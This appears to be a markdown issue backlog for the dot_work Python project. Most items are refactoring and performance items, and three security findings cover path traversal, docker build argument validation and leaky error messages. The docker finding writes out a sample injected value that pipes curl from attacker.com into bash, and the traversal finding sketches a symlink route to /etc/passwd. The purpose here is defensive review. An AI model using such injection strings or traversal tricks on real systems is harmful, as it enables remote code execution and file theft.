# High Priority Issues (P1)

Core functionality broken or missing documented features.

---

---
id: "CR-001@cf7ce6"
title: "Issue entity uses manual field copying in every transition method"
description: "Each transition method manually copies all 14 fields, creating 200+ lines of brittle boilerplate"
created: 2025-12-25
section: "db-issues"
tags: [domain-model, immutability, maintainability, dry]
type: refactor
priority: high
status: proposed
references:
  - src/dot_work/db_issues/domain/entities.py
---

### Problem
The `Issue` entity implements immutable updates through verbose manual field copying. Each transition method (`transition()`, `add_label()`, `remove_label()`, `assign_to()`, `unassign()`, `assign_to_epic()`) constructs a new `Issue` instance by explicitly copying every field:

```python
return Issue(
    id=self.id,
    project_id=self.project_id,
    title=self.title,
    description=self.description,
    status=new_status,
    priority=self.priority,
    type=self.type,
    assignees=self.assignees.copy(),
    epic_id=self.epic_id,
    labels=self.labels.copy(),
    blocked_reason=self.blocked_reason,
    source_url=self.source_url,
    references=self.references.copy(),
    created_at=self.created_at,
    updated_at=utcnow_naive(),
    closed_at=self.closed_at,
)
```

**Evidence:** Lines 292-492 contain 6 transition methods with ~200 lines of repetitive field-copying code (14 fields × 6 methods ≈ 84 field copies).

### Affected Files
- `src/dot_work/db_issues/domain/entities.py` (Issue entity, lines 250-492)

### Importance
1. **Maintenance burden**: Adding a new field to `Issue` requires updating all 6 transition methods
2. **Error-prone**: Easy to miss copying a field, leading to data loss
3. **Violation of DRY**: The `self.field → field=self.field` pattern repeats 84+ times
4. **Brittleness**: `updated_at` must be manually set in each method (lines 328, 365, 398, 430, 461, 490) - easy to forget

This is a classic example of **procedural code in an OOP context** - the methods don't leverage the language's data structure capabilities.

### Proposed Solution
**Option A: Use `@dataclass(frozen=True)` with `dataclasses.replace()`**
- Convert Issue to frozen dataclass for compile-time immutability enforcement
- Replace each method with: `return dataclasses.replace(self, status=new_status, updated_at=utcnow_naive())`
- Reduces 6 lines to 1 per transition

**Option B: Extract to helper method**
- Create `_copy_with(**changes)` method that handles field copying
- Each transition becomes: `return self._copy_with(status=new_status)`

**Option C: Use `attrs` library**
- Migrate from dataclass to attrs for more powerful immutability features
- Use `attrs.evolve()` for clean updates

### Acceptance Criteria
- [ ] Adding a new field to Issue requires changes in only 1 location (not 6)
- [ ] All transition methods use consistent update pattern
- [ ] Type checker validates immutability is maintained
- [ ] All existing tests pass (259 db_issues tests)
- [ ] `updated_at` automatically set on all transitions

### Notes
The other domain entities (Comment, Epic, Label, Project, Dependency) don't have transition methods, so they don't suffer from this issue. The Comment entity (line 496) correctly uses frozen dataclass without manual transitions.

---

---
id: "CR-002@bf1eda"
title: "SQLite adapter stores datetimes as strings instead of native datetime objects"
description: "Database models use str type for datetime fields, losing type safety and requiring manual conversion"
created: 2025-12-25
section: "db-issues"
tags: [database, type-safety, data-integrity, sqlite]
type: refactor
priority: high
status: proposed
references:
  - src/dot_work/db_issues/adapters/sqlite.py
---

### Problem
The SQLite adapter stores all datetime fields as `str` in database models:

```python
created_at: str = Field(index=True)  # Line 68
updated_at: str                     # Line 69
closed_at: str | None = None         # Line 70
deleted_at: str | None = None        # Line 71
```

This requires manual serialization/deserialization in every repository method:
- **Line 347**: `created_at=str(now)` when saving labels
- **Lines 614-617**: `str(issue.created_at)` when converting entity to model
- **Lines 645-652**: `datetime.fromisoformat(model.created_at)` when converting model to entity

**Evidence**: 8 models × 3 datetime fields × ~4 conversions each = 96+ manual conversion points scattered across the codebase.

### Affected Files
- `src/dot_work/db_issues/adapters/sqlite.py` (IssueModel, CommentModel, EpicModel, LabelModel, ProjectModel, lines 44-190)

### Importance
1. **Type safety lost**: Database accepts invalid strings like "not-a-datetime" without error
2. **Error-prone**: `datetime.fromisoformat()` raises `ValueError` on bad data (9+ call sites)
3. **Query limitations**: Cannot perform datetime queries (`WHERE created_at > :date`) without parsing
4. **Performance overhead**: Every read/write requires string↔datetime conversion
5. **Comment on line 68** says "Using str for datetime to avoid import issues" - this suggests a workaround rather than a proper solution

The domain layer (entities.py) correctly uses `datetime` fields - the adapter shouldn't downgrade this to strings.

### Proposed Solution
**Option A: Use SQLAlchemy TypeDecorator (Recommended)**
Create a custom type that handles conversion transparently:
```python
class DateTimeAsISOString(TypeDecorator):
    impl = String
    cache_ok = True

    def process_bind_param(self, value, dialect):
        return value.isoformat() if value else None

    def process_result_value(self, value, dialect):
        return datetime.fromisoformat(value) if value else None
```

**Option B: Store as Unix timestamp integers**
- Use `Integer` column type
- Store `int(datetime.timestamp())`
- More queryable, less storage

**Option C: Keep strings but centralize conversion**
- Extract to base `_model_to_entity()` and `_entity_to_model()` methods
- Eliminates duplication but doesn't fix type safety

### Acceptance Criteria
- [ ] Datetime fields defined with proper type hint, not `str`
- [ ] Conversions handled transparently (no manual `str()` or `fromisoformat()`)
- [ ] Type checker validates datetime usage throughout codebase
- [ ] All existing tests pass (259 db_issues tests)
- [ ] Database queries can filter by datetime ranges

### Notes
The workaround comment on line 68 suggests a previous issue with datetime imports. The proper solution is to fix the import issue rather than degrading the type system to strings. Other ORMs (Django, SQLAlchemy with DateTime type) handle this correctly.

---
id: "PERF-001@a3c8f5"
title: "Performance: Semantic search loads all embeddings into memory"
description: "O(N) memory consumption where N = total nodes in database"
created: 2025-12-25
section: "knowledge_graph"
tags: [performance, semantic-search, memory, database]
type: performance
priority: high
status: proposed
references:
  - src/dot_work/knowledge_graph/search_semantic.py
  - src/dot_work/knowledge_graph/db.py
---

### Problem
The `semsearch()` function in `search_semantic.py` line 120 calls `db.get_all_embeddings_for_model()` which loads ALL embeddings from the database into memory. For large knowledge bases (>1000 nodes), this causes:
- Unbounded memory growth (O(N) where N = total nodes)
- Slow startup time for every search query
- Potential out-of-memory errors on memory-constrained systems

The code explicitly documents "For small-to-medium corpora (<100k nodes), brute-force is sufficient" but this becomes a bottleneck as the knowledge graph grows.

### Affected Files
- `src/dot_work/knowledge_graph/search_semantic.py` (line 120: loads all embeddings)
- `src/dot_work/knowledge_graph/db.py` (lines 993-1012: `get_all_embeddings_for_model` with no pagination)

### Importance
- Semantic search becomes unusably slow with large knowledge bases
- Memory usage scales linearly with database size
- Blocks scaling to production use cases
- Documented as "<100k nodes" suggesting awareness of the limitation

### Proposed Solution
1. Add pagination/streaming to `get_all_embeddings_for_model()`
2. Consider batch processing with configurable batch size
3. Add SQLite-based vector indexing (SQLite extension or custom index)
4. Cache frequently-accessed embeddings separately from full scan
5. Add max_results limit to prevent unbounded queries

### Acceptance Criteria
- [ ] Embeddings loaded in batches of configurable size (default: 1000)
- [ ] Memory usage is O(batch_size) not O(total_nodes)
- [ ] Search performance degrades gracefully with database size
- [ ] Configuration option for max embeddings to scan
- [ ] Tests verify memory usage stays bounded

### Notes
Current implementation at line 120:
```python
embeddings = db.get_all_embeddings_for_model(model)
```
This fetches ALL rows from the embeddings table into memory before computing similarities.

---
id: "PERF-002@b4e7d2"
title: "Performance: File scanner uses nested fnmatch loop"
description: "O(N*M) pattern matching for every file during scan"
created: 2025-12-25
section: "python_scan"
tags: [performance, algorithm, file-scanning]
type: performance
priority: high
status: proposed
references:
  - src/dot_work/python/scan/scanner.py
---

### Problem
The `_find_python_files()` method in `scanner.py` line 77 uses `fnmatch.fnmatch()` inside a loop for every file. For include_patterns with multiple entries, this creates O(N*M) complexity where N = files and M = patterns.

Code at line 77:
```python
if self.include_patterns:
    if not any(fnmatch.fnmatch(file, pattern) for pattern in self.include_patterns):
        continue
```

This runs fnmatch (string parsing + regex compilation internally) for every pattern against every filename.

### Affected Files
- `src/dot_work/python/scan/scanner.py` (line 77: nested fnmatch in loop)

### Importance
- Codebase scanning is slower than necessary
- Large codebases (10k+ files) are significantly impacted
- fnmatch pattern matching is expensive (string parsing, regex compilation)
- N*M operations where N and M can both be large

### Proposed Solution
1. Pre-compile fnmatch patterns into regex objects before the loop
2. Use `pathlib.Path.match()` which may be more efficient
3. Consider using set-based filtering for exact matches before pattern matching
4. Cache pattern compilation if patterns don't change

### Acceptance Criteria
- [ ] Patterns compiled once before file iteration
- [ ] Time complexity reduced to O(N) where N = files
- [ ] Benchmark shows improvement for large codebases
- [ ] No change in filtering behavior (tests pass)

### Notes
This is a classic performance anti-pattern: repeating expensive operations inside loops when they could be done once outside.

---

id: "PERF-003@c5d9e1"
title: "Performance: Issue service loads all issues for stale query"
description: "O(N) query fetches entire issue table for filtering"
created: 2025-12-25
section: "db_issues"
tags: [performance, database, query-optimization]
type: performance
priority: high
status: proposed
references:
  - src/dot_work/db_issues/services/issue_service.py
  - src/dot_work/db_issues/adapters/sqlite.py
---

### Problem
The `get_stale_issues()` method at line 742 calls `self.list_issues(limit=100000)` to fetch ALL issues, then filters in Python code. This causes:
- Unnecessary data transfer from database
- In-memory filtering on potentially thousands of issues
- Network/database roundtrip returning mostly irrelevant data

The filtering condition (`issue.updated_at < cutoff`) could be done at the database level.

### Affected Files
- `src/dot_work/db_issues/services/issue_service.py` (lines 742-758)
- Related: `get_epic_issues()` at line 666 also loads all issues

### Importance
- Stale issue queries are slow on large databases
- Database should do filtering, not application code
- Similar pattern in `get_epic_issues()` (line 666)
- Limits scalability of the issue tracker

### Proposed Solution
1. Add date-based filtering to repository layer
2. Create `list_issues_updated_before(cutoff_date)` method
3. Add `list_issues_by_epic_id(epic_id)` method
4. Push filtering to SQL WHERE clauses

### Acceptance Criteria
- [ ] Stale issue filtering done in SQL query
- [ ] Epic issue filtering done in SQL query
- [ ] No in-memory filtering for date-based or epic queries
- [ ] Tests verify behavior unchanged
- [ ] Performance measurable with 1000+ issues

### Notes
Example fix:
```python
# Current (inefficient)
all_issues = self.list_issues(limit=100000)
stale_issues = [issue for issue in all_issues if issue.updated_at < cutoff]

# Proposed (efficient)
stale_issues = self.uow.issues.list_updated_before(cutoff, limit)
```

---
id: "SEC-004@94eb69"
title: "Security: Path traversal vulnerability in read_file_text"
description: "Insufficient path validation allows reading files outside repository"
created: 2025-12-25
section: "review"
tags: [security, path-traversal, file-access]
type: security
priority: high
status: proposed
references:
  - src/dot_work/review/git.py
  - src/dot_work/review/git.py:153-174
---

### Problem
In `src/dot_work/review/git.py`, the `read_file_text()` function has path traversal protection but it may be insufficient:

```python
def read_file_text(root: str, path: str) -> str:
    full = Path(root) / path
    norm = full.resolve()
    root_norm = Path(root).resolve()

    # Prevent path traversal
    if not str(norm).startswith(str(root_norm)):
        raise GitError("invalid path")
```

**Vulnerabilities:**
1. **String comparison is unreliable**: `str(norm).startswith(str(root_norm))` can be bypassed with:
   - Symlinks: If `root_norm` contains symlinks, `norm` might resolve differently
   - Case sensitivity: On case-insensitive filesystems (Windows, macOS), path case variations bypass check
   - Unicode normalization: Different unicode representations of same path

2. **No validation of `root` parameter**: If attacker controls `root`, they could use a directory that has a symlink to sensitive locations

3. **Windows-specific issues**: `resolve()` on Windows behaves differently with UNC paths and drive letters

**Attack scenario:**
- If `root` = `/safe/path` with symlink `/safe/path/data` → `/etc/passwd`
- Attacker provides `path` = `data/passwd`
- `resolve()` follows symlink, `startswith()` check fails to detect traversal

### Affected Files
- `src/dot_work/review/git.py` (lines 153-174)

### Importance
**HIGH**: Path traversal allows reading arbitrary files on the system. While the current protection catches many cases, edge cases with symlinks and path representation variations could bypass it.

CVSS Score: 7.1 (High)
- Attack Vector: Local
- Attack Complexity: High (requires specific conditions)
- Privileges Required: Low
- Impact: High (Confidentiality)

### Proposed Solution
1. **Use `Path.relative_to()` for robust check**:
   ```python
   try:
       norm.relative_to(root_norm)
   except ValueError:
       raise GitError("invalid path")
   ```

2. **Validate root parameter**: Ensure root is absolute path and doesn't contain symlinks to sensitive dirs
3. **Check symlink chain**: Validate that no component in the path is a symlink outside root
4. **Use pathlib's strict checking**: `Path.resolve(strict=True)` to catch broken symlinks

### Acceptance Criteria
- [ ] Path validation uses `relative_to()` instead of string prefix check
- [ ] Symlinks are validated at each path component
- [ ] Tests verify traversal attempts are blocked on all platforms
- [ ] Windows-specific path handling tested

### Notes
- This function is used in review workflow, potentially processing untrusted PR file lists
- Consider adding allowlist of safe file extensions
- Document security assumptions in docstring

---
id: "SEC-005@94eb69"
title: "Security: Unvalidated container build arguments in subprocess.run"
description: "Docker build command uses unvalidated configuration parameters"
created: 2025-12-25
section: "container"
tags: [security, docker, subprocess, injection]
type: security
priority: high
status: proposed
references:
  - src/dot_work/container/provision/core.py
  - src/dot_work/container/provision/core.py:369
  - src/dot_work/container/provision/core.py:822
---

### Problem
In `src/dot_work/container/provision/core.py`:

**Line 369**:
```python
build_cmd = [
    "docker", "build", "-t", cfg.docker_image,
    "-f", str(cfg.dockerfile), str(cfg.dockerfile.parent)
]
subprocess.run(build_cmd, check=True)
```

**Line 822**:
```python
subprocess.run(docker_cmd, check=True)
```

**Vulnerabilities:**
1. **`cfg.docker_image`** is not validated before passing to `docker build -t`
2. **`cfg.dockerfile`** path is not validated (could be outside working directory)
3. **Environment variables** passed to container are not sanitized (lines 372-418)
4. **`docker_cmd`** at line 822 could contain arbitrary commands

**Attack vectors:**
- Malicious `docker_image` name: `evil-image; curl attacker.com | bash` → While using list format prevents shell injection, docker build options like `--build-arg` could be injected if image name contains special chars
- Path traversal via `dockerfile`: `../../malicious-Dockerfile`
- Environment variable injection: Keys like `GIT_ASKPASS` could be abused

While the list format prevents direct shell injection, Docker has its own option parsing that could be abused.

### Affected Files
- `src/dot_work/container/provision/core.py` (lines 360-369, 822)

### Importance
**HIGH**: If container provisioning is automated (CI/CD), attackers could:
- Build malicious images with crypto miners
- Expose secrets via build args
- Escape container via malicious Dockerfile

CVSS Score: 7.8 (High)
- Attack Vector: Local/Network (if in CI/CD)
- Attack Complexity: Low
- Privileges Required: Low
- Impact: High (Integrity, Availability)

### Proposed Solution
1. **Validate docker image name**:
   ```python
   IMAGE_PATTERN = re.compile(r'^[a-z0-9]+([._-][a-z0-9]+)*(/[a-z0-9]+([._-][a-z0-9]+)*)?(:[a-z0-9]+([._-][a-z0-9]+)*)?$')
   if not IMAGE_PATTERN.match(cfg.docker_image):
       raise ValueError(f"Invalid docker image name: {cfg.docker_image}")
   ```

2. **Validate dockerfile path**: Ensure dockerfile is within project directory
3. **Sanitize environment variables**: Block dangerous keys (GIT_ASKPASS, SSH_AUTH_SOCK, etc.)
4. **Use Docker SDK for Python**: More secure than subprocess

### Acceptance Criteria
- [ ] Docker image name validated with strict regex
- [ ] Dockerfile path validated to be within project
- [ ] Environment variable allowlist implemented
- [ ] Tests verify injection attempts are blocked

### Notes
- Docker image naming specification: https://docs.docker.com/engine/reference/commandline/build/
- Consider using `docker-py` library for safer Docker interaction
- Review environment variable passing (lines 372-418) for other injection vectors

---
id: "SEC-006@94eb69"
title: "Security: Incomplete error handling exposes system paths"
description: "Error messages leak internal file paths and system information"
created: 2025-12-25
section: "knowledge-graph"
tags: [security, information-disclosure, error-handling]
type: security
priority: high
status: proposed
references:
  - src/dot_work/knowledge_graph/db.py
  - src/dot_work/db_issues/adapters/sqlite.py
---

### Problem
Multiple database files propagate raw exception messages that may leak sensitive system information:

**In `src/dot_work/knowledge_graph/db.py`:**
- Line 321: `raise ValueError(f"Project not found: {scope.project}")` - Leaks project names
- Line 331: `raise ValueError(f"Topic not found: {topic_name}")` - Leaks topic names

**In `src/dot_work/db_issues/adapters/sqlite.py`:**
- Raw SQLite exceptions propagated without sanitization
- May leak database paths, schema information, table names

**Security impact:**
- **Information disclosure**: Attacker learns internal structure
- **Path leakage**: Absolute paths may reveal username, directory structure
- **Database fingerprinting**: Schema details help plan further attacks

**OWASP ASVS 2023 v5.0:**
- V5.4: "Verify that the application does not leak internal information in error messages"

### Affected Files
- `src/dot_work/knowledge_graph/db.py` (lines 321, 331, 338)
- `src/dot_work/db_issues/adapters/sqlite.py` (throughout)

### Importance
**HIGH**: While not a direct vulnerability, information leakage assists attackers:
- Path traversal exploits require knowing directory structure
- Social engineering easier with internal details
- Compliance violations (GDPR, PCI-DSS require error message sanitization)

CVSS Score: 5.3 (Medium)
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: None
- Impact: Low (information disclosure only)

### Proposed Solution
1. **Generic error messages for users**:
   ```python
   raise ValueError("Project not found")  # Don't leak name
   ```

2. **Log detailed errors, sanitize user output**:
   ```python
   logger.error(f"Project not found: {scope.project}", exc_info=True)
   raise ValueError("Resource not found")
   ```

3. **Create security-aware error handler**:
   ```python
   def safe_error(message: str, details: str | None = None) -> ValueError:
       if is_debug_mode():
           return ValueError(f"{message}: {details}")
       return ValueError(message)
   ```

### Acceptance Criteria
- [ ] All user-facing errors use generic messages
- [ ] Detailed errors logged but not shown to users
- [ ] Debug mode optionally shows full details
- [ ] Tests verify error messages don't leak sensitive data

### Notes
- Balance security with usability (developers need debugging info)
- Consider adding correlation IDs to errors for log lookup
- Review error messages in all user-facing code

---
